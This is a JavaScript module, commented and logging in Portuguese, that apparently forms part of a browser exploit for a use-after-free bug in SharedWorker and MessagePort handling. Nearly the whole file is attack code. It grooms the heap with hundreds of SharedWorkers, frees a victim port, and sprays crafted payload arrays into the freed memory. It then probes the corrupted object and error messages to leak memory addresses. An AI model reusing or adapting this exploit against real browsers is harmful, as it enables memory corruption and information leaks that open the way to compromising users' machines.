import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_checkerboard_heap, clear_heap } from './heap.mjs';
import { build_leak_payload } from './payloads.mjs';

var workers_stash = [];
var is_running = false;
var interval_ref = null;

export function init() {
    const btn = document.getElementById("btn_run");
    if(btn) {
        btn.addEventListener("click", start_exploit);
        log("Módulos carregados. Alvo fixado em 0xA0.", "success");
    }
}

async function start_exploit() {
    if (is_running) return;
    if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
    
    is_running = true;
    log(">>> INICIANDO ATAQUE (0xA0) <<<", "warn");

    // 1. Preparar Memória (Checkerboard para 0xA0)
    prepare_checkerboard_heap(0xA0);
    
    // 2. Payload
    const payload = build_leak_payload(0xA0);

    // 3. Grooming (Base)
    workers_stash = [];
    for(let i=0; i<380; i++) {
        try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
    }

    // 4. Trigger Loop
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 380;

    interval_ref = setInterval(() => {
        if (p_count >= limit) {
            clearInterval(interval_ref);
            
            // O ÚLTIMO (403)
            const victim = workers_stash.pop();
            
            // Tenta o Leak
            attempt_leak(victim, payload);
            
            is_running = false;
            return;
        }

        try {
            // Criar worker
            let w = new SharedWorker("data:text,1", "v_"+p_count);
            w.port.start();
            workers_stash.push(w);
            
            // Feedback visual reduzido para performance
            if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
        } catch(e) {}
        
        p_count++;
    }, 60); // Levemente mais rápido para evitar que o GC limpe antes
}

function attempt_leak(victim, payload) {
    log("!!! DISPARANDO SWAP (0xA0) !!!", "warn");
    
    const port = victim.port;
    
    // 1. FREE
    victim.port.close();
    
    // 2. SPRAY (Imediato)
    // Usamos slice() para clonar o array rapidamente
    const spray = [];
    for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
        spray.push(payload.slice(0));
    }

    // 3. VERIFICAÇÃO
    setTimeout(() => {
        try {
            // Se o objeto foi sobrescrito, ele não é mais uma Porta válida.
            // O .toString() deve mudar ou dar erro.
            const s = port.toString();
            
            if (s.indexOf("MessagePort") === -1) {
                log("!!! SUCESSO ABSOLUTO !!!", "leak");
                log("Objeto Corrompido: " + s, "leak");
                alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
            } else {
                log("Falha: Objeto intacto [object MessagePort].");
                log("Tentando forçar erro de ponteiro...");
                
                // Teste de estresse: acessar propriedade inexistente
                // Se o vtable estiver corrompido, isso gera um erro com endereço
                let temp = port.onmessage; 
            }
        } catch (e) {
            // Se cair aqui, analise a mensagem de erro!
            log("ERRO CAPTURADO: " + e, "leak");
            if(e.toString().match(/0x/)) {
                alert("LEAK NO ERRO: " + e);
            }
        }
        
        cleanup();
    }, 500);
}

function cleanup() {
    workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
    clear_heap();
}
